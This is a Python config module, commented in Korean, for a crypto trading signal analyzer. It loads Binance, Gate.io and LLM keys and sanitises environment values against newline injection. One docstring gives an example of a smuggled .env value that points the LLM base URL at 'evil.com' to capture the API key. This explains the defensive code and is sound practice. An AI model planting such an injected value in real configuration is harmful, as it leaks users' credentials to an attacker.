# =============================================
# Crypto Trading Signal Analyzer - Config
# =============================================
# ⚠️ 보안 주의: API 키는 .env 파일에서 관리합니다.
#    .gitignore에 .env를 반드시 추가하세요!

import hmac
import os
from pathlib import Path
from dotenv import load_dotenv

# .env 파일 로드 (실행 위치와 무관하게 현재 파일 기준으로 탐색)
_BASE_DIR = Path(__file__).resolve().parent
load_dotenv(_BASE_DIR / ".env")
load_dotenv()


def _safe_env(key: str, default: str = "") -> str:
    """환경변수를 읽고 CRLF 문자를 제거합니다.

    .env 파일에 개행문자(\\n, \\r)가 포함된 값이 있으면
    python-dotenv 가 추가 변수를 주입(CRLF Injection)할 수 있습니다.
    예: LLM_API_KEY=sk-xxx\\nLLM_BASE_URL=https://evil.com
    → LLM SDK/HTTP client 가 공격자 서버로 API 키를 전송하는 취약점.
    이를 방지하기 위해 모든 env 값에서 개행문자를 제거합니다.
    """
    val = os.getenv(key, default) or default
    return val.replace("\r", "").replace("\n", "").strip()


# 기본값 "changeme" 와 동일한 값은 "비밀번호 미설정" 으로 취급하기 위한 상수
_OWNER_PASSWORD_DEFAULT = "changeme"


def owner_password_configured() -> bool:
    """OWNER_PASSWORD 가 실제로 설정되어 있는지 여부.

    - 비어 있으면 False
    - 기본값 'changeme' 그대로면 False
    → 실제로 비밀번호를 바꾼 경우에만 인증 기능을 허용한다.
    """
    pw = OWNER_PASSWORD
    return bool(pw) and pw != _OWNER_PASSWORD_DEFAULT


def verify_owner_password(supplied: object) -> bool:
    """타이밍-공격 내성으로 OWNER_PASSWORD 를 비교.

    - 비밀번호가 설정되지 않았으면 어떤 값이 와도 False (기능 비활성)
    - 입력이 str 이 아니면 False
    - hmac.compare_digest 로 상수 시간 비교
    """
    if not owner_password_configured():
        return False
    if not isinstance(supplied, str):
        return False
    return hmac.compare_digest(supplied.encode("utf-8"), OWNER_PASSWORD.encode("utf-8"))


def sanitize_env_value(value: object) -> str:
    """.env 파일에 기록할 값을 안전하게 정리.

    - str 이 아니면 빈 문자열
    - CR/LF/NUL 제거 (줄바꿈 삽입 시 추가 환경변수 주입 가능)
    - 앞뒤 공백 제거
    """
    if not isinstance(value, str):
        return ""
    return value.replace("\r", "").replace("\n", "").replace("\x00", "").strip()


def _safe_int_env(key: str, default: int) -> int:
    try:
        return int(_safe_env(key, str(default)))
    except Exception:
        return default


def _safe_bool_env(key: str, default: bool) -> bool:
    raw = _safe_env(key, "true" if default else "false").lower()
    return raw not in ("0", "false", "no", "off", "")


_LEGACY_ANTHROPIC_KEY_ENV = "CLAUDE" + "_API_KEY"
_LEGACY_ANTHROPIC_MODEL_ENV = "CLAUDE" + "_MODEL"
ANTHROPIC_API_KEY = _safe_env("ANTHROPIC_API_KEY", _safe_env(_LEGACY_ANTHROPIC_KEY_ENV))
ANTHROPIC_MODEL   = _safe_env("ANTHROPIC_MODEL", _safe_env(_LEGACY_ANTHROPIC_MODEL_ENV, "claude-sonnet-4-6"))

_default_provider = "openai_oauth"
LLM_PROVIDER     = _safe_env("LLM_PROVIDER", _default_provider).lower()
LLM_BASE_URL     = _safe_env("LLM_BASE_URL", "http://127.0.0.1:10532/v1").rstrip("/")
LLM_API_KEY      = _safe_env("LLM_API_KEY")
LLM_MODEL        = _safe_env("LLM_MODEL", "gpt-5.6-sol")
LLM_MAX_TOKENS   = int(_safe_env("LLM_MAX_TOKENS", _safe_env("ANALYST_MAX_TOKENS", "8000")) or "8000")
LLM_TEMPERATURE  = float(_safe_env("LLM_TEMPERATURE", "0.2") or "0.2")
LLM_TIMEOUT_SECS = float(_safe_env("LLM_TIMEOUT_SECS", "120") or "120")

ANALYSIS_COOLDOWN_SECS = max(0, _safe_int_env("ANALYSIS_COOLDOWN_SECS", 0))
ANALYSIS_DEBOUNCE_SECS = max(0, _safe_int_env("ANALYSIS_DEBOUNCE_SECS", 5))
PREVENT_CONCURRENT_ANALYSIS = _safe_bool_env("PREVENT_CONCURRENT_ANALYSIS", True)

def llm_api_key_configured() -> bool:
    if LLM_PROVIDER == "openai_oauth":
        return bool(LLM_BASE_URL and LLM_MODEL)
    if LLM_PROVIDER == "anthropic":
        return bool(ANTHROPIC_API_KEY)
    return bool(LLM_API_KEY)

BINANCE_BASE_URL    = "https://api.binance.com"
BINANCE_FUTURES_URL = "https://fapi.binance.com"
BINANCE_API_KEY     = _safe_env("BINANCE_API_KEY")
BINANCE_SECRET_KEY  = _safe_env("BINANCE_SECRET_KEY")
DEFAULT_SYMBOL      = _safe_env("DEFAULT_SYMBOL", "BTCUSDT").upper()

# ── Gate.io 계좌 연동 ─────────────────────────
# ACCOUNT_PROVIDER: "gateio" | "binance" | "none"
ACCOUNT_PROVIDER         = _safe_env("ACCOUNT_PROVIDER", "none").lower()
ACCOUNT_FEATURES_ENABLED = _safe_bool_env("ACCOUNT_FEATURES_ENABLED", False)
ACCOUNT_INCLUDE_IN_LLM   = _safe_bool_env("ACCOUNT_INCLUDE_IN_LLM", False)
GATE_BASE_URL            = _safe_env("GATE_BASE_URL", "https://api.gateio.ws/api/v4").rstrip("/")
GATE_SETTLE              = _safe_env("GATE_SETTLE", "usdt").lower()
GATE_API_KEY             = _safe_env("GATE_API_KEY")
GATE_API_SECRET          = _safe_env("GATE_API_SECRET")
# GATE_ACCOUNT_READONLY=1 은 의도적 설정 선언용 (코드 내에서 변경 시도 방지)
GATE_ACCOUNT_READONLY    = _safe_bool_env("GATE_ACCOUNT_READONLY", True)
# Spot 권한 키 (선택): Affiliate Ultra Commission Self-Rebate 조회용
# 설정 안 하면 GATE_API_KEY 로 시도 (spot 권한 없으면 graceful 처리)
GATE_SPOT_API_KEY        = _safe_env("GATE_SPOT_API_KEY") or _safe_env("GATE_API_KEY")
GATE_SPOT_API_SECRET     = _safe_env("GATE_SPOT_API_SECRET") or _safe_env("GATE_API_SECRET")
GATE_REBATE_RATE         = max(0.0, min(1.0, float(_safe_env("GATE_REBATE_RATE", "0.70") or "0.70")))

# Decision-support policy. Gross fee is displayed as a warning; the conservative
# net fee ratio (confirmed rebates + a fraction of pending rebates) drives tiers.
FEE_TO_EQUITY_REDUCE_THRESHOLD = float(_safe_env("FEE_TO_EQUITY_REDUCE_THRESHOLD", "0.02") or "0.02")
FEE_TO_EQUITY_BLOCK_THRESHOLD  = float(_safe_env("FEE_TO_EQUITY_BLOCK_THRESHOLD", "0.05") or "0.05")
HARD_BLOCK_THRESHOLD           = float(_safe_env("HARD_BLOCK_THRESHOLD", "0.10") or "0.10")
EXPECTED_REBATE_RECOGNITION    = max(0.0, min(1.0, float(_safe_env("EXPECTED_REBATE_RECOGNITION", "0.50") or "0.50")))
SETUP_MIN_RR                   = max(0.1, float(_safe_env("SETUP_MIN_RR", "1.20") or "1.20"))
NEARBY_LEVEL_PCT               = max(0.0, float(_safe_env("NEARBY_LEVEL_PCT", "0.005") or "0.005"))


def gate_key_configured() -> bool:
    """Gate API key/secret 이 실제로 설정되어 있는지 여부."""
    return bool(GATE_API_KEY and GATE_API_SECRET)


def gate_spot_key_configured() -> bool:
    """Gate spot 전용 key/secret이 설정되어 있는지 여부."""
    return bool(GATE_SPOT_API_KEY and GATE_SPOT_API_SECRET)


def symbol_to_pair(symbol: str) -> str:
    symbol = (symbol or "").upper()
    quote_candidates = ("USDC", "USDT", "FDUSD", "BUSD", "TUSD", "USD", "BTC", "ETH", "BNB")
    for quote in quote_candidates:
        if symbol.endswith(quote) and len(symbol) > len(quote):
            return f"{symbol[:-len(quote)]}/{quote}"
    return symbol

# ── 매매 설정 (참고용 레버리지) ──────────────
DEFAULT_LEVERAGE      = 3       # 희망 레버리지 배수

OWNER_PASSWORD = _safe_env("OWNER_PASSWORD", _OWNER_PASSWORD_DEFAULT)  # 주인장 확성기 비밀번호

# 분석할 시간봉 목록
TIMEFRAMES = ["5m", "15m", "1h", "4h", "1d"]

# 각 시간봉별 로드할 캔들 수
CANDLE_LIMIT = 200

# 자동 갱신 기본 간격 (초)  ← 30분
AUTO_REFRESH_INTERVAL = 1800

# ── 색상 팔레트 ──────────────────────────────
BG_COLOR      = "#0d0d1a"   # 배경
PANEL_COLOR   = "#13132a"   # 사이드 패널
ACCENT_COLOR  = "#1e1e4a"   # 강조 영역
TEXT_COLOR    = "#dce1f0"   # 기본 텍스트
GREEN_COLOR   = "#00e676"   # 매수
RED_COLOR     = "#ff1744"   # 매도
YELLOW_COLOR  = "#ffd740"   # 홀드 / 강조
BLUE_COLOR    = "#40c4ff"   # 보조
PURPLE_COLOR  = "#ce93d8"   # RSI 선
